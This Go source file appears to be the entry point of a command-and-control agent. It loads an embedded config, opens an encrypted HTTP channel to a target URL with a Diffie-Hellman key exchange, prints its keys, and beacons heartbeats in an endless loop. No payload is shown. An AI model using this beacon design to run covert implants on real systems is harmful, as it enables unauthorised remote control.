package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"time"

	"../crypto/dh"
	"./app"
	"./comm"
)

func main() {
	config, err := LoadEmbeddedConfig()
	// config, err := LoadConfig("config.json")
	if err != nil {
		fmt.Printf("Error reading config file: %s\n", err)
		return
	}

	config_json, _ := json.Marshal(&config)
	fmt.Printf("Loaded config:\n%s\n", config_json)

	httpClient := comm.NewHttpClient(config.TargetUrl)
	encHttpClient := comm.NewEncryptedClient(httpClient, config.SymKey)

	keyExchange, err := dh.NewKeyExchange(config.PrivateKey)
	if err != nil {
		fmt.Printf("Error creating key exchange: %s\n", err)
		return
	}

	client := comm.NewDHClient(keyExchange, encHttpClient)

	agent := app.NewAgent(client)

	encodedPrivateKey := base64.StdEncoding.EncodeToString(keyExchange.GetPrivateKey())
	fmt.Printf("Private Key: %s\n", encodedPrivateKey)

	encodedPublicKey := base64.StdEncoding.EncodeToString(keyExchange.GetPublicKey())
	fmt.Printf("Public Key: %s\n", encodedPublicKey)

	selfSharedKey, _ := keyExchange.GetSharedKey(keyExchange.GetPublicKey())
	encodedSelfSharedKey := base64.StdEncoding.EncodeToString(selfSharedKey)
	fmt.Printf("Self Shared Key: %s\n", encodedSelfSharedKey)
	fmt.Printf("Client ID: %s\n", hex.EncodeToString(client.GetClientID()))

	for {
		err := agent.Heartbeat()
		if err != nil {
			fmt.Printf("Error: %s\n", err)
		}
		time.Sleep(time.Duration(config.ConnectionIntervalMs) * time.Millisecond)
	}

}
